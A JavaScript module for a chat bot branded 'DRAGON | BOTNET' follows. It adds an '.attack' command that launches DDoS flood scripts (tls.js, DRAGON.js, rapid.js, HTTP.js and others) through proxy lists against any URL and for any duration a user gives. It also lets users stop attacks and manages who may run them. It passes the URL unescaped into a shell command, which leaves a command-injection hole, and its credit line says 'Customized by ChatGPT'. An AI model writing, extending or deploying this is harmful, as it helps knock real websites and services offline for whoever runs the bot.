const { exec, spawn } = require('child_process');
const fs = require('fs');

let currentAttackProcesses = {}; // Store active attack processes

module.exports.config = {
    name: "attack",
    version: "1.0.0",
    hasPermssion: 0,
    credits: "Customized by ChatGPT",
    description: "Send an attack command to the specified URL",
    commandCategory: "admin",
    usages: ".attack <method> <url> <duration>",
    cooldowns: 5
};

// Function to get the current timestamp in a readable format
const getFormattedTime = () => {
    const now = new Date();
    return now.toISOString().replace('T', ' ').slice(0, -5);
};

// Function to check if the user is authorized
const isAuthorizedUser = (userId) => {
    const authorizedUsers = fs.readFileSync('./authorized_users.txt', 'utf-8').split('\n');
    return authorizedUsers.includes(userId.toString());
};

// Main attack command
module.exports.run = async ({ api, event, args }) => {
    const { senderID, threadID, messageID } = event;

    // Check if the user is authorized
    if (!isAuthorizedUser(senderID)) {
        return api.sendMessage("You are not authorized to use this command.", threadID, messageID);
    }

    // Check if an attack is already running
    if (currentAttackProcesses[threadID]) {
        return api.sendMessage("An attack is already in progress. Please stop the current attack before starting a new one.", threadID, messageID);
    }

    // Parse command arguments
    const [method, url, duration] = args;
    if (!method || !url || !duration) {
        return api.sendMessage("Invalid command usage. Correct usage: .attack <method> <url> <duration>", threadID, messageID);
    }

    // Define attack commands based on the method
    const commands = {
        "crash": `go run crash.go ${url} 15000 get ${duration}`,
        "tls": `node tls.js ${url} ${duration} 128 20 proxy.txt`,
        "browser": `node DRAGON.js ${url} ${duration} 32 15 proxy.txt`,
        "rapid": `node rapid.js ${url} ${duration} 126 15 proxy.txt`,
        "black": `node BLACK.js ${url} ${duration} 128 20 proxy.txt`,
        "http": `node HTTP.js ${url} ${duration} 132 15 proxy.txt`,
        "bypass": `node rapid.js ${url} ${duration} 126 15 proxy.txt`,
    };

    const command = commands[method.toLowerCase()];
    if (!command) {
        return api.sendMessage("Invalid attack method. Available methods: crash, tls, browser, rapid, black, http, bypass.", threadID, messageID);
    }

    try {
        // Execute the command on the VPS
        const attackProcess = spawn(command, { shell: true });

        // Store the process for later termination
        currentAttackProcesses[threadID] = attackProcess;

        attackProcess.stdout.on('data', (data) => {
            console.log(`stdout: ${data}`);
        });

        attackProcess.stderr.on('data', (data) => {
            console.error(`stderr: ${data}`);
        });

        attackProcess.on('close', (code) => {
            console.log(`Attack process exited with code ${code}`);
            delete currentAttackProcesses[threadID]; // Clean up
        });

        // Prepare and send attack confirmation message
        const startTime = getFormattedTime();
        const attackMessage = {
            body: `𝗗𝗥𝗔𝗚𝗢𝗡 | 𝗕𝗢𝗧𝗡𝗘𝗧:\n[❗]\n\n>Command Executed!\n▬▭▬▭▬▭▬▭▬▭▬▭▬\nTarget: ${url}\nDuration: ${duration} seconds\nMethod: ${method}\n*Start Time:* ${startTime}\n*Running Attacks:* 1/1\n➖➖➖➖➖➖➖➖➖➖\n*Owner : ( @YourAdminUsername )*`,
            quick_replies: [
                {
                    content_type: "text",
                    title: "Stop Attack",
                    payload: "STOP_ATTACK" // Button payload
                },
                {
                    content_type: "text",
                    title: "Help",
                    payload: "HELP" // Button payload
                }
            ]
        };

        api.sendMessage(attackMessage, threadID, messageID);

        // Wait for the specified time before sending the end message
        setTimeout(() => {
            if (currentAttackProcesses[threadID]) {
                currentAttackProcesses[threadID].kill(); // Kill the attack process if it's still running
                delete currentAttackProcesses[threadID]; // Clean up
            }
            api.sendMessage("Attack has ended.", threadID, messageID);
        }, parseInt(duration) * 1000);

    } catch (error) {
        console.error("Error during attack execution:", error);
        api.sendMessage("Failed to start the attack.", threadID, messageID);
    }
};

// Command to handle button presses
module.exports.handleButtonPress = async ({ api, event }) => {
    const { threadID, messageID } = event;

    if (event.message && event.message.quick_reply) {
        const payload = event.message.quick_reply.payload;

        if (payload === "STOP_ATTACK") {
            if (currentAttackProcesses[threadID]) {
                currentAttackProcesses[threadID].kill(); // Stop the attack process
                delete currentAttackProcesses[threadID]; // Clean up
                api.sendMessage("The attack has been stopped.", threadID, messageID);
            } else {
                api.sendMessage("No active attack found to stop.", threadID, messageID);
            }
        } else if (payload === "HELP") {
            // Provide help information
            api.sendMessage("Here is how to use the attack command: ...", threadID, messageID);
        }
    }
};

// Function to add an authorized user
const addAuthorizedUser = (userId) => {
    if (!isAuthorizedUser(userId)) {
        fs.appendFileSync('./authorized_users.txt', `\n${userId}`);
    }
};

// Function to remove an authorized user
const removeAuthorizedUser = (userId) => {
    let users = fs.readFileSync('./authorized_users.txt', 'utf-8').split('\n');
    users = users.filter(id => id !== userId.toString());
    fs.writeFileSync('./authorized_users.txt', users.join('\n'));
};

// Admin commands to manage authorized users (add/remove)
module.exports.adduser = async ({ api, event, args }) => {
    const { senderID, threadID, messageID } = event;

    // Check if sender is an admin
    const isAdmin = senderID === '61558095808001'; // Replace with your own admin ID
    if (!isAdmin) {
        return api.sendMessage("Only admins can use this command.", threadID, messageID);
    }

    const userIdToAdd = args[0];
    if (!userIdToAdd) {
        return api.sendMessage("Please specify a user ID to authorize.", threadID, messageID);
    }

    addAuthorizedUser(userIdToAdd);
    api.sendMessage(`User ${userIdToAdd} has been authorized.`, threadID, messageID);
};

module.exports.removeuser = async ({ api, event, args }) => {
    const { senderID, threadID, messageID } = event;

    // Check if sender is an admin
    const isAdmin = senderID === '61558095808001'; // Replace with your own admin ID
    if (!isAdmin) {
        return api.sendMessage("Only admins can use this command.", threadID, messageID);
    }

    const userIdToRemove = args[0];
    if (!userIdToRemove) {
        return api.sendMessage("Please specify a user ID to remove.", threadID, messageID);
    }

    removeAuthorizedUser(userIdToRemove);
    api.sendMessage(`User ${userIdToRemove} has been removed from the authorized list.`, threadID, messageID);
};